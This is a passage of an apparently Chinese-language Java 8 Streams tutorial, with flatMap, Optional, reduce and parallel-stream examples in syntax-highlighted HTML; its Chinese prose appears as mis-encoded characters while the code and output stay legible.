class="token comment">// Bar1 &lt;- Foo3</span><span class="token comment">// Bar2 &lt;- Foo3</span><span class="token comment">// Bar3 &lt;- Foo3</span></code></pre><p>æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸåœ°å°†ä¸‰ä¸ªfooå¯¹è±¡çš„æµè½¬æ¢ä¸ºä¹ä¸ªbarå¯¹è±¡çš„æµã€‚</p><p>æœ€åï¼Œä¸Šé¢çš„ä»£ç ç¤ºä¾‹å¯ä»¥ç®€åŒ–ä¸ºä¸€ä¸ªæµæ“ä½œçš„å•ä¸€ç®¡é“:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">mapToObj</span><span class="token punctuation">(</span>i <span class="token operator">-></span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token string">"Foo"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span>f <span class="token operator">-></span> <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">mapToObj</span><span class="token punctuation">(</span>i <span class="token operator">-></span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token string">"Bar"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" &lt;- "</span> f<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>bars<span class="token operator">::</span><span class="token function">add</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>f <span class="token operator">-></span> f<span class="token punctuation">.</span>bars<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>b <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>FlatMap</code>ä¹Ÿé€‚ç”¨äºJava 8ä¸­å¼•å…¥çš„<code>Optional</code>ç±»ã€‚<code>flatMap</code>æ“ä½œè¿”å›å¦ä¸€ç§ç±»å‹çš„å¯é€‰å¯¹è±¡ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨å®ƒæ¥é˜²æ­¢è®¨åŒçš„ç©ºæ£€æŸ¥ã€‚</p><p>æƒ³æƒ³è¿™æ ·ä¸€ä¸ªé«˜åº¦åˆ†å±‚çš„ç»“æ„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Outer</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Nested</span> nested<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Nested</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Inner</span> inner<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Inner</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> foo<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸ºäº†è§£æå¤–éƒ¨å®ä¾‹çš„å†…éƒ¨å­—ç¬¦ä¸²<code>foo</code>ï¼Œä½ å¿…é¡»æ·»åŠ å¤šä¸ªç©ºæ£€æŸ¥æ¥é˜²æ­¢å¯èƒ½çš„<code>nullpointerexception</code>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Outer</span> outer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>outer <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> outer<span class="token punctuation">.</span>nested <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> outer<span class="token punctuation">.</span>nested<span class="token punctuation">.</span>inner <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>outer<span class="token punctuation">.</span>nested<span class="token punctuation">.</span>inner<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åŒæ ·çš„è¡Œä¸ºå¯ä»¥é€šè¿‡ä½¿ç”¨å¯é€‰çš„<code>flatMap</code>æ“ä½œè·å¾—:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>o <span class="token operator">-></span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>nested<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>n <span class="token operator">-></span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>inner<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>i <span class="token operator">-></span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯¹flatMapçš„æ¯æ¬¡è°ƒç”¨è¿”å›ä¸€ä¸ªå¯é€‰çš„åŒ…è£…(å¦‚æœå­˜åœ¨)æ‰€éœ€å¯¹è±¡ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¿”å›nullã€‚</p><h3 id="Reduce">Reduce</h3><p><code>reduce</code>æ“ä½œå°†æµçš„æ‰€æœ‰å…ƒç´ åˆå¹¶ä¸ºä¸€ä¸ªç»“æœã€‚Java 8æ”¯æŒä¸‰ç§ä¸åŒçš„reduceæ–¹æ³•ã€‚ç¬¬ä¸€ç§æ–¹æ³•å°†å…ƒç´ æµç¼©å‡ä¸ºæµä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚</p><p>è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ¥ç¡®å®šæœ€å¹´é•¿çš„äºº:</p><pre class="language-java" data-language="java"><code class="language-java">persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span> <span class="token operator">-></span> p1<span class="token punctuation">.</span>age <span class="token operator">></span> p2<span class="token punctuation">.</span>age <span class="token operator">?</span> p1 <span class="token operator">:</span> p2<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Pamela</span></code></pre><p><code>reduce</code>æ–¹æ³•æ¥å—ä¸€ä¸ª<code>BinaryOperator</code>ç´¯åŠ å™¨å‡½æ•°ã€‚è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ª<code>BiFunction</code>ï¼Œå…¶ä¸­ä¸¤ä¸ªæ“ä½œæ•°å…±äº«åŒä¸€ç±»å‹ï¼Œåœ¨è¿™é‡Œæ˜¯<code>Person</code>ã€‚<code>BiFunctions</code>ç±»ä¼¼äº<code>Function</code>ï¼Œä½†æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¤ºä¾‹å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªäººçš„å¹´é¾„ï¼Œä»¥ä¾¿è¿”å›å…·æœ‰æœ€å¤§å¹´é¾„çš„äººã€‚</p><p>ç¬¬äºŒä¸ªreduceæ–¹æ³•åŒæ—¶æ¥å—æ ‡è¯†å€¼å’Œ<code>BinaryOperator</code>ç´¯åŠ å™¨ã€‚è¯¥æ–¹æ³•å¯ç”¨äºæ„é€ ä¸€ä¸ªæ–°çš„Personï¼Œ</p><p>è¯¥Personå…·æœ‰æ¥è‡ªæµä¸­æ‰€æœ‰å…¶ä»–äººå‘˜çš„èšåˆåç§°å’Œå¹´é¾„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> result <span class="token operator">=</span>    persons        <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            p1<span class="token punctuation">.</span>age <span class="token operator">+=</span> p2<span class="token punctuation">.</span>age<span class="token punctuation">;</span>            p1<span class="token punctuation">.</span>name <span class="token operator">+=</span> p2<span class="token punctuation">.</span>name<span class="token punctuation">;</span>            <span class="token keyword">return</span> p1<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"name=%s; age=%s"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span>name<span class="token punctuation">,</span> result<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// name=MaxPeterPamelaDavid; age=76</span></code></pre><p>ç¬¬ä¸‰ä¸ªreduceæ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°:<code>ä¸€ä¸ªæ ‡è¯†å€¼</code>ã€<code>ä¸€ä¸ªBiFunctionç´¯åŠ å™¨</code>å’Œ<code>ä¸€ä¸ªBinaryOperatorç±»å‹</code>çš„ç»„åˆå‡½æ•°ã€‚å› ä¸ºèº«ä»½å€¼ç±»å‹ä¸é™äºPersonç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªçº¦ç®€æ¥ç¡®å®šæ‰€æœ‰äººçš„å¹´é¾„æ€»å’Œ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> ageSum <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>sum<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">-></span> sum <span class="token operator">+=</span> p<span class="token punctuation">.</span>age<span class="token punctuation">,</span> <span class="token punctuation">(</span>sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">)</span> <span class="token operator">-></span> sum1 <span class="token operator">+</span> sum2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ageSum<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 76</span></code></pre><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œç»“æœæ˜¯76ï¼Œä½†åœ¨å¼•æ“ç›–ä¸‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ?è®©æˆ‘ä»¬é€šè¿‡ä¸€äº›è°ƒè¯•è¾“å‡ºæ¥æ‰©å±•ä¸Šé¢çš„ä»£ç :</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> ageSum <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>sum<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"accumulator: sum=%s; person=%s\n"</span><span class="token punctuation">,</span> sum<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> sum <span class="token operator">+=</span> p<span class="token punctuation">.</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"combiner: sum1=%s; sum2=%s\n"</span><span class="token punctuation">,</span> sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> sum1 <span class="token operator">+</span> sum2<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// accumulator: sum=0; person=Max// accumulator: sum=18; person=Peter// accumulator: sum=41; person=Pamela// accumulator: sum=64; person=David</span></code></pre><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œç´¯åŠ å™¨å‡½æ•°å®Œæˆäº†æ‰€æœ‰çš„å·¥ä½œã€‚å®ƒé¦–å…ˆè¢«è°ƒç”¨ï¼Œåˆå§‹å€¼ä¸º0ï¼Œç¬¬ä¸€ä¸ªäººæ˜¯Maxã€‚åœ¨æ¥ä¸‹æ¥çš„ä¸‰ä¸ªæ­¥éª¤ä¸­ï¼Œæ€»å’Œéšç€æœ€åä¸€æ­¥çš„å¹´é¾„ä¸æ–­å¢åŠ ï¼Œç›´åˆ°76å²ã€‚</p><p>Wait what?åˆæˆå™¨(combiner)ä»æ¥æ²¡æœ‰è¢«è°ƒç”¨?å¹¶è¡Œæ‰§è¡ŒåŒä¸€ä¸ªæµå°†è§£é™¤ç§˜å¯†:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> ageSum <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">parallelStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>sum<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"accumulator: sum=%s; person=%s\n"</span><span class="token punctuation">,</span> sum<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> sum <span class="token operator">+=</span> p<span class="token punctuation">.</span>age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"combiner: sum1=%s; sum2=%s\n"</span><span class="token punctuation">,</span> sum1<span class="token punctuation">,</span> sum2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> sum1 <span class="token operator">+</span> sum2<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// accumulator: sum=0; person=Pamela</span><span class="token comment">// accumulator: sum=0; person=David</span><span class="token comment">// accumulator: sum=0; person=Max</span><span class="token comment">// accumulator: sum=0; person=Peter</span><span class="token comment">// combiner: sum1=18; sum2=23</span><span class="token comment">// combiner: sum1=23; sum2=12</span><span class="token comment">// combiner: sum1=41; sum2=35</span></code></pre><p>å¹¶è¡Œæ‰§è¡Œæ­¤æµä¼šå¯¼è‡´å®Œå…¨ä¸åŒçš„æ‰§è¡Œè¡Œä¸ºã€‚ç°åœ¨åˆå¹¶å™¨è¢«è°ƒç”¨äº†ã€‚ç”±äºç´¯åŠ å™¨æ˜¯å¹¶è¡Œè°ƒç”¨çš„ï¼Œå› æ­¤éœ€è¦åˆå¹¶å™¨å°†å•ç‹¬ç´¯åŠ çš„å€¼ç›¸åŠ ã€‚</p><p>è®©æˆ‘ä»¬åœ¨ä¸‹ä¸€ç« æ›´æ·±å…¥åœ°æ¢è®¨å¹¶è¡Œæµã€‚</p></div><h2 id="å¹¶è¡Œæµ-Parallel-Streams">å¹¶è¡Œæµ(Parallel Streams)</h2><div class="story post-story"><p>æµå¯ä»¥å¹¶è¡Œæ‰§è¡Œï¼Œä»¥æé«˜å¤§é‡è¾“å…¥å…ƒç´ çš„è¿è¡Œæ—¶æ€§èƒ½ã€‚å¹¶è¡Œæµä½¿ç”¨é€šè¿‡é™æ€<code>ForkJoinPool. commonpool()</code>æ–¹æ³•å¯ç”¨çš„å…¬å…±<code>ForkJoinPool</code>ã€‚åº•å±‚çº¿ç¨‹æ± çš„å¤§å°æœ€å¤šä½¿ç”¨5ä¸ªçº¿ç¨‹â€”å–å†³äºå¯ç”¨çš„ç‰©ç†CPUå†…æ ¸çš„æ•°é‡:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ForkJoinPool</span> commonPool <span class="token operator">=</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span><span class="token function">commonPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>commonPool<span class="token punctuation">.</span><span class="token function">getParallelism</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 3</span></code></pre><p>åœ¨æˆ‘çš„æœºå™¨ä¸Šï¼Œå…¬å…±æ± åˆå§‹åŒ–æ—¶çš„å¹¶è¡Œåº¦é»˜è®¤ä¸º3ã€‚è¿™ä¸ªå€¼å¯ä»¥é€šè¿‡è®¾ç½®ä»¥ä¸‹JVMå‚æ•°æ¥å¢åŠ æˆ–å‡å°‘:</p><pre class="language-text" data-language="text"><code class="language-text">-Djava.util.concurrent.ForkJoinPool.common.parallelism=5</code></pre><p>é›†åˆæ”¯æŒ<code>parallelStream()</code>æ–¹æ³•æ¥åˆ›å»ºå…ƒç´ çš„å¹¶è¡Œæµã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥åœ¨ç»™å®šæµä¸Šè°ƒç”¨ä¸­é—´æ–¹æ³•<code>parallel()</code>æ¥å°†é¡ºåºæµè½¬æ¢ä¸ºå¹¶è¡Œå¯¹åº”æµã€‚</p><p>ä¸ºäº†å°‘æè¿°å¹¶è¡Œæµçš„å¹¶è¡Œæ‰§è¡Œè¡Œä¸ºï¼Œä¸‹é¢çš„ä¾‹å­å°†å½“å‰çº¿ç¨‹çš„ä¿¡æ¯æ‰“å°åˆ°<code>sout:</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"c2"</span><span class="token punctuation">,</span> <span class="token string">"c1"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">parallelStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"filter: %s [%s]\n"</span><span class="token punctuation">,</span>            s<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"map: %s [%s]\n"</span><span class="token punctuation">,</span>            s<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"forEach: %s [%s]\n"</span><span class="token punctuation">,</span>        s<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é€šè¿‡ç ”ç©¶è°ƒè¯•è¾“å‡ºï¼Œæˆ‘ä»¬åº”è¯¥æ›´å¥½åœ°ç†è§£å“ªäº›çº¿ç¨‹å®é™…ç”¨äºæ‰§è¡Œæµæ“ä½œ:</p><pre class="language-text" data-language="text"><code class="language-text">filter:  b1 [main]filter:  a2 [ForkJoinPool.commonPool-worker-1]map:     a2 [ForkJoinPool.commonPool-worker-1]filter:  c2 [ForkJoinPool.commonPool-worker-3]map:     c2 [ForkJoinPool.commonPool-worker-3]filter:  c1 [ForkJoinPool.commonPool-worker-2]map:     c1 [ForkJoinPool.commonPool-worker-2]forEach: C2 [ForkJoinPool.commonPool-worker-3]forEach: A2 [ForkJoinPool.commonPool-worker-1]map:     b1 [main]forEach: B1 [main]filter:  a1 [ForkJoinPool.commonPool-worker-3]map:     a1 [ForkJoinPool.commonPool-worker-3]forEach: A1 [ForkJoinPool.commonPool-worker-3]forEach: C1 [ForkJoinPool.commonPool-worker-2]</code></pre><p>æ­£å¦‚æ‚¨å¯ä»¥çœ‹åˆ°çš„ï¼Œå¹¶è¡Œæµåˆ©ç”¨äº†å…¬å…±<code>ForkJoinPool</code>ä¸­çš„æ‰€æœ‰å¯ç”¨çº¿ç¨‹æ¥æ‰§è¡Œæµæ“ä½œã€‚è¿ç»­è¿è¡Œæ—¶çš„è¾“å‡ºå¯èƒ½ä¸åŒï¼Œå› ä¸ºå®é™…ä½¿ç”¨çš„ç‰¹å®šçº¿ç¨‹çš„è¡Œä¸ºæ˜¯ä¸ç¡®å®šçš„ã€‚</p><p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªé¢å¤–çš„æµæ“ä½œâ€”â€”<code>sort</code>æ¥æ‰©å±•è¿™ä¸ªç¤ºä¾‹:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"c2"</span><span class="token punctuation">,</span> <span class="token string">"c1"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">parallelStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"filter: %s [%s]\n"</span><span class="token punctuation">,</span>            s<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"map: %s [%s]\n"</span><span class="token punctuation">,</span>            s<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"sort: %s &lt;> %s [%s]\n"</span><span class="token punctuation">,</span>            s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s1<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"forEach: %s [%s]\n"</span><span class="token punctuation">,</span>        s<span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä¹ä¸€çœ‹ï¼Œç»“æœå¯èƒ½å¾ˆå¥‡æ€ª:</p><pre class="language-txt" data-language="txt"><code class="language-txt">filter:  c2 [ForkJoinPool.commonPool-worker-3]filter:  c1 [ForkJoinPool.commonPool-worker-2]map:     c1 